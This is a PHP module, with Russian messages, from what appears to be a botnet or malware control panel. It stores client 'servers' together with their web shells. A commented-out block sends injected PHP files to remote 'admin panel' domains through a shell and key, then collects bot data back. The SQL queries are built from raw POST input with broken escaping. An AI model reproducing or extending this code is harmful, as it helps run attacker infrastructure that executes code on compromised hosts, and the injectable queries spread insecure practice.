<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){    $client = $mysqli->query('select * from bf_clients where (id = \''.$Cur['id'].'\')');

    if($client->id == $Cur['id']){
		$smarty->assign("client", $client);
		if(isset($_POST['submit'])){			array_walk($_POST, 'real_escape_string');

			if(empty($_POST['ip'])){				$bad_form['ip'] = 'IP сервера не может быть пустым.';
				$FORM_BAD = 1;
			}else{				$result = $mysqli->query("SELECT ip FROM bf_servers WHERE (ip='".$_POST['ip']."')");
				if($result->ip == $_POST['ip']){					$bad_form['ip'] = 'Введенный "IP сервера" уже есть в системе.';
					$FORM_BAD = 1;
				}
			}

			/*
			if(!empty($_POST['link'])){
					$result = $mysqli->query("SELECT domain FROM bf_domains WHERE (domain='".$_POST['link']."')");
					if($result->domain == $_POST['link']){
						$bad_form['ip'] = 'Введенный "Домен админки" уже есть в системе.';
						$FORM_BAD = 1;
					}else{						$result = $mysqli->query("SELECT link, keyid FROM bf_admins WHERE (link='".$_POST['link']."')");
						if($result->link == $_POST['link']){							$bad_form['link'] = 'Введенный "Домен админки" уже есть в системе.';
							$FORM_BAD = 1;
						}else{							$get_php = file_get_contents('modules/admins/injects/start.php');
							$get_php .= "print('OK');";
							if(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']) != 'OK'){								$bad_form['get_result'] = 'На данном домене админка не найдена или ключ не верен.';
								$FORM_BAD = 1;
							}else{								$get_php = file_get_contents('modules/admins/injects/start.php');
								$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
								$get_php .= file_get_contents('modules/admins/injects/get_info.php');
								$cbots = json_decode(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']), true);
							}
						}
					}
			}
            */

			if($FORM_BAD <> 1){
				if($mysqli->query("INSERT INTO bf_servers (ip, shell, client_id, post_id) VALUES ('".$_POST['ip']."', '".$_POST['shell']."', '".$client->id."', '".$_SESSION['user']->id."')") == false){
					$errors .= '<div class="t"><div class="t4" align="center">Добавления клинента сейчас невозможно, попробуйте позже.</div></div>';
				}else{
					$smarty->assign("registration_end", true);
				}
			}else{
				if(count($bad_form) > 0){
					rsort($bad_form);
					for($i = 0; $i < count($bad_form); $i++){
						if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
						$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
					}
				}
			}
			$smarty->assign("account_errors", $errors);
		}
	}
}

?>